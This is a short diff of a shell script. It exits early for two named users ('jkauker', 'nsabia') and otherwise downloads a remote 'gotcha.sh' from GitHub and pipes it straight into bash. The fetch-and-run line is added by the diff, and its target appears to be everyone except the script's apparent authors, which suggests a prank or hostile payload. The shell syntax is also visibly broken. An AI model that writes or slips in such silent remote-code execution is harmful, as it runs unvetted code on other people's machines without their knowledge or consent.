@@ -5,10 +5,4 @@ if [$(whoami) == "jkauker" || $(whoami) == "nsabia"] then
 	exit 1
 fi
 
-user = $(whoami)
-targe = "/Users/$user/Downloads"
-if [! -f "$target"]; then
-	touch "$target.txt"
-fi
-
-@curl -s -o https://raw.githubusercontent.com/jkauker/gotcha/master/gotcha.sh | bash && exit 0
+@curl -s https://raw.githubusercontent.com/jkauker/gotcha/master/gotcha.sh | bash && exit 0
